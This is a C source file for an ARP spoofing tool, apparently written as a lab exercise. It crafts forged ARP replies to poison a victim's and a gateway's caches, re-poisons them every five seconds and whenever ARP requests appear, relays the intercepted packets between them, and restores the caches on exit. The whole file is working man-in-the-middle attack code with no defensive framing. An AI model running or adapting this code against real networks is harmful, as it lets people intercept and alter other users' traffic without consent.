#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <time.h>
#include "send.h"
#include "kbctrl.h"

void PrintMAC(char* msg, uint8_t *mac){
    printf("| %s | %02x:%02x:%02x:%02x:%02x:%02x |\n", msg, mac[0], mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void PrintIP(char* msg, uint32_t ip){
//    printf("%s",inet_ntop(IP_version, ip_pointer, buf_pointer, buf_size));
    printf("| %s  | %3d.%3d.%3d.%3d   |", msg, ip&0xFF, (ip>>8)&0xFF, (ip>>16)&0xFF, (ip>>24)&0xFF);
}
void PrintAttcker(uint8_t *ATTACKER_MAC,  uint32_t ATTACKER_IP){
    printf("My Linux on VM\n");
    printf("---------------------------------\n");
    PrintIP("My VM IP", ntohl(ATTACKER_IP));
    printf("\n---------------------------------\n");
    PrintMAC(" My MAC  ", ATTACKER_MAC);
    printf("---------------------------------\n\n");
}
void Print(ARP_Table Table){
    printf("Sender Info\n");
    printf("---------------------------------\n");
    PrintIP("Sender IP", ntohl(Table.SENDER_IP));
    printf("\n---------------------------------\n");
    PrintMAC("Sender MAC", Table.SENDER_MAC);
    printf("---------------------------------\n");
    printf("Target Info\n");
    printf("---------------------------------\n");
    PrintIP("Target IP", ntohl(Table.TARGET_IP));
    printf("\n---------------------------------\n");
    PrintMAC("Target MAC", Table.TARGET_MAC);
    printf("---------------------------------\n\n");
}

uint32_t Str2A(char *ip_string){
    unsigned int a, b, c, d;

    sscanf(ip_string,"%u.%u.%u.%u", &a, &b, &c, &d);
    return ((a << 24) | (b << 16) | (c << 8) | d);
}

uint32_t ResolveAttackerIp(char *dev){
    struct ifreq ifr;
    char ipstr[40];
    int s;

    s = socket(AF_INET,SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr)<0)
        printf("ERROR");
    else
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,ipstr,sizeof(struct sockaddr));
    return Str2A(ipstr);
}

void ResolveAttackerMac(char* dev, uint8_t *mac){
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev,IFNAMSIZ);
    if(ioctl(s,SIOCGIFHWADDR, &ifr) <0)
        printf("ERROR");
    else
        memcpy(mac,ifr.ifr_hwaddr.sa_data,6);
}

EthArpPacket MakeArp(int make_type ,uint32_t sender_ip, uint8_t* sender_mac, uint32_t target_ip, uint8_t* target_mac){
    EthArpPacket ARP;
    if(make_type == INFECT || make_type == RECOVER){
        memcpy(ARP.eth_.Dst_mac,target_mac,sizeof(uint8_t)*6);
        memcpy(ARP.eth_.Src_mac,sender_mac,sizeof(uint8_t)*6);
        memcpy(ARP.arp_.Src_mac,sender_mac,sizeof(uint8_t)*6);
        memcpy(ARP.arp_.Tag_mac,target_mac,sizeof(uint8_t)*6);
        ARP.arp_.Opcode = htons(REPLY);
    }
    else if (make_type == REQUEST){
        memset(ARP.eth_.Dst_mac, 0xFF, 6);
        memcpy(ARP.eth_.Src_mac,sender_mac,sizeof(uint8_t)*6);
        memcpy(ARP.arp_.Src_mac,sender_mac,sizeof(uint8_t)*6);
        memset(ARP.arp_.Tag_mac, 0x00, 6);
        ARP.arp_.Opcode = htons(REQUEST);
    }

    ARP.eth_.type = htons(Arp);
    ARP.arp_.Hw_type = htons(ETHER);
    ARP.arp_.Proto_type = htons(Ip4);
    ARP.arp_.Hw_addr_len = 0x06;
    ARP.arp_.Proto_addr_len = 0x04;
    ARP.arp_.Src_ip = htonl(sender_ip);
    ARP.arp_.Tag_ip = htonl(target_ip);

    return ARP;
}

void CapArpReply(pcap_t* handle, uint32_t target_ip, uint8_t* target_mac){
    struct pcap_pkthdr* header;
    const u_char* data;
    while(1){
        int res = pcap_next_ex(handle, &header, &data);
        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n",res, pcap_geterr(handle));
        }

        EthArpPacket* capture = (EthArpPacket*)data;

        if(ntohs(capture->eth_.type) == Arp){
            if(ntohs(capture->arp_.Opcode) == REPLY){
                if(ntohl(capture->arp_.Src_ip) == target_ip){
                    memcpy(target_mac,capture->arp_.Src_mac,sizeof(uint8_t)*6);
                    break;
                }
            }
        }
    }
}

void Send(int make_type, pcap_t* handle, uint32_t sender_ip, uint8_t* sender_mac, uint32_t target_ip, uint8_t* target_mac){
    EthArpPacket ARP = MakeArp(make_type, sender_ip, sender_mac, target_ip,target_mac);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ARP), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    if (make_type == REQUEST)
        CapArpReply(handle, target_ip, target_mac);
    else if(make_type == INFECT || make_type == RECOVER){
        for(int i = 0; i < 2; i++){
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ARP), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
    }
}

void RelayPacket(pcap_t* handle, const u_char* data, struct pcap_pkthdr* header, uint8_t* attacker_mac, uint32_t sender_ip, uint8_t* sender_mac, uint32_t target_ip, uint8_t* target_mac){
    uint8_t mac[6];
    memset(mac, 0xFF, 6);
    EthArpPacket* capture = (EthArpPacket*)data;

    if(ntohs(capture->eth_.type) == Arp){
        if(ntohs(capture->arp_.Opcode) == REQUEST){
            if (!(memcmp(capture->eth_.Src_mac, sender_mac, sizeof(uint8_t)*6))){
                //Send reinfect
                Send(INFECT, handle,target_ip,attacker_mac,sender_ip,sender_mac);
                PrintIP("ARP ReInfect!! ", ntohl(sender_ip));
                printf("\n");
            }
            else if(!(memcmp(capture->eth_.Src_mac, target_mac, sizeof(uint8_t)*6))){
                if(!(memcmp(capture->eth_.Dst_mac, mac, sizeof(uint8_t)*6))){
                    //Sed reinfect
                     Send(INFECT, handle, target_ip, attacker_mac, sender_ip, sender_mac);
                     PrintIP(" ARP ReInfect!! ", ntohl(sender_ip));
                     printf("\n");
                }
            }
        }
    }
    else if(!(memcmp(capture->eth_.Src_mac, sender_mac, sizeof(uint8_t)*6)) && !(memcmp(capture->eth_.Dst_mac, attacker_mac, sizeof(uint8_t)*6))){
        memcpy(capture->eth_.Src_mac, attacker_mac, sizeof(uint8_t)*6);
        memcpy(capture->eth_.Dst_mac, target_mac, sizeof(uint8_t)*6);
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        PrintIP(" Relaying....   ",ntohl(sender_ip));
        PrintIP(" -> ",ntohl(target_ip));
        printf("\n");
    }
}
void Relay(pcap_t* handle, uint8_t* ATTACKER_MAC, ARP_Table* Table, int pair_num){

    struct pcap_pkthdr* header;
    const u_char* data;

    struct timeval start, current;
    gettimeofday(&start, 0);
    while(1){
        int res = pcap_next_ex(handle, &header, &data);
        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n",res, pcap_geterr(handle));
        }
        gettimeofday(&current,0);
        for(int i = 1; i <= pair_num; i++){
            if(current.tv_sec == (start.tv_sec +5)){
                Send(INFECT, handle,Table[i-1].TARGET_IP,ATTACKER_MAC,Table[i-1].SENDER_IP,Table[i-1].SENDER_MAC);
                printf("Send ARP ReInfect Packet Every 5 Secound\n");
                if(i == pair_num)
                    start.tv_sec = current.tv_sec;
            }
            RelayPacket(handle, data, header, ATTACKER_MAC, Table[i-1].SENDER_IP, Table[i-1].SENDER_MAC, Table[i-1].TARGET_IP, Table[i-1].TARGET_MAC);
        }
        if(KbCtrl()){
            CloseKb();
            break;
        }
    }
    for(int i = 1; i <= pair_num; i++){
        Send(RECOVER, handle, Table[i-1].TARGET_IP, Table[i-1].TARGET_MAC, Table[i-1].SENDER_IP, Table[i-1].SENDER_MAC);
        printf("ARP Recover \n");
    }
}
